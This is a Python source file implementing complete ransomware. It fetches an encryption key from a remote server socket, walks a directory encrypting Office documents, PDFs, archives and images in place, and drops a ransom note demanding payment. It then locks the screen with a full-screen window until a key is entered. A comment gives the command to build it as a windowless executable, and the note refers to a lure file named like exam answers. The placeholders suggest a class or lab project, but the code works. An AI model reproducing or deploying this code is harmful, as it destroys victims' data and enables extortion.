import os
from cryptography.fernet import Fernet
import tkinter as tk
import socket
from tkinter import *
from tkinter import messagebox
import shutil
import getpass

#python -m PyInstaller --onefile -w encrypt.py

#get key from server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
IP_ADDRESS = 'SERVER.IP.GOES.HERE'
PORT = 9090
client_socket.connect((IP_ADDRESS, PORT))
key = client_socket.recv(1024)


CURRENT_USER = getpass.getuser()


# Define directories to exclued and file extensions to encrypt
EXCLUDED_DIRECTORIES = ('Program Files',
                        'Program Files (x86)',
                        'Windows',
                        '$Recycle.Bin',
                        'AppData',
                        'ransom',
        )
EXTENSIONS = ( 
        '.doc', '.docx', '.xls', '.xlsx', '.ppt','.pptx', # Microsoft office
        '.odt', '.odp', '.ods', '.rtf', '.tex', '.pdf', '.epub', '.md', '.txt', # OpenOffice, Adobe, Latex, Markdown, etc
        '.zip', '.tar', '.tgz', '.bz2', '.7z', '.rar', '.bak',  # compressed formats
        '.jpg', '.jpeg', '.bmp', '.gif', '.png', '.svg', '.psd', '.raw', # images
)

# Finds files to encrypt
file_paths = []
directory = r'TEST\DIRECTORY\HERE'
for root, dirs, files in os.walk(directory):
    if any(s in root for s in EXCLUDED_DIRECTORIES):
        pass
    else:
        for file in files:
            if file.endswith(EXTENSIONS):
                TARGET = os.path.join(root, file)
                file_paths.append(TARGET)
                print(root)

                    
# Define function to encrypt a single file
def encrypt_file(filename):
    fernet = Fernet(key) # initialize a fernet object with the encryption key
    with open(filename, "rb") as file: # read the contents of the file
        file_content = file.read()
    encrypted_content = fernet.encrypt(file_content) # encrypt the file's contents
    with open(filename, "wb") as file: # overwrite the original file with the encrypted content
        file.write(encrypted_content)




 


# Defines function to encrypt all files
def encrypt_all():
    desktop_path = os.path.expanduser("~/Desktop") # get desktop path and create new directory for ransom
    new_directory = "ransom"
    new_directory = os.path.join(desktop_path, new_directory)  
    os.mkdir(new_directory)
    ransom_note = "ransom.txt"
    ransom_path = os.path.join(new_directory, ransom_note) # set ransom note file path
    for file in file_paths: 
        current_file = file.strip() # strip white spaces
        encrypt_file(current_file) # Encrypt each file in file_paths
    with open(ransom_path, "w") as ransom_file: # Write ransom note
        ransom_file.write(f"USER: {CURRENT_USER}")
        ransom_file.write("You will recive your decryption key once you have paid the rasom\n")
        ransom_file.write("Do not attempt to decrypt on your own")
        ransom_file.write("Do not move any files from their original location")
        ransom_file.write("If you have closed the window, open the file 378_Final_Answers.pdf again.")
    


def decryption_screen(): # Define function to display decryption screen
    root = tk.Tk()  # Create root window
    screen_width = root.winfo_screenwidth() # get screen dimesnsions
    screen_height = root.winfo_screenheight()# get screen dimesnsions
    gap = (screen_height/50)
    root.geometry(f"{screen_width}x{screen_height}")
    root.configure(background="blue")
    labe1 = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED")
    labe1.config(font=('tohoma', int(gap)))
    labe1.config(background='blue',foreground='white')
    labe1.pack(anchor='n', ipady=20) # Create label for displaying the encryption message
    


    labe3 = tk.Label(root, text="To unlock the encryption you will need a decryption key.")
    labe3.config(font=('tahoma', int(gap)))
    labe3.config(background="blue", foreground="white")
    labe3.pack(anchor='n', ipady=20) # Create label for displaying the encryption message

    labe4 = tk.Label(root, text="You will recieve the key once you have paid the ransom.\nInput the key below:")
    labe4.config(font=('tahoma',int(gap)))
    labe4.config(background='blue',foreground='white')
    labe4.pack(anchor='n', ipady=20) # Create label for displaying the encryption message
    

    def decrypt_all():

        try:
            user_input = entry.get() # get user input from entry widget
            if user_input != key.decode(): # check if user input matches the key
                raise ValueError("Incorrect key")
        except ValueError as e:
            messagebox.showerror("Error", e) # show an error message if an incorrect key is entered
            return



        def decrypt_file(filename): # Define a function to decrypt an individual file
            fernet = Fernet(user_input) # create Fernet instance with user input
            with open(filename, "rb") as file: # read encrypted file content
                file_content = file.read()
            decrypted_content = fernet.decrypt(file_content) # decrypt file content
            with open(filename, "wb") as file:
                file.write(decrypted_content) # write decrypted content back to file
            print(filename)

        for file in file_paths: # loop through all file paths and decrypt each file
            decrypt_file(file)
        messagebox.showinfo("Success", "Your Files have been decrypted.") # show a success message after all files have been decrypted
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop") 
        ransom_note_dir = "ransom"
        ransom_note_path = os.path.join(desktop_path, ransom_note_dir)
        shutil.rmtree(ransom_note_path) # get desktop path and delete ransom note directory
        root.destroy() # destroy the root window


    entry = tk.Entry(root, width=int(screen_width/10))
    entry.pack(anchor='n', ipady=20) # create an entry widget for user to input decryption key

    canvas1 = tk.Canvas(root, bg='blue', highlightthickness=0, height=20, width=screen_width)
    canvas1.pack() 

    key_submit = tk.Button(root, text='Submit', command=decrypt_all)
    key_submit.pack(anchor='n') # create a submit button to innitiate decryption process

    root.mainloop() # start the main loop





if __name__ == '__main__':
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    ransom_note_directory = "ransom"
    ransom_note_path = os.path.join(desktop_path, ransom_note_directory)

    if os.path.exists(ransom_note_path) is False: #if ransom path does not exist encrypt
        encrypt_all()
        decryption_screen()
    else: #files already encrypted, show decryption screen only
        decryption_screen()
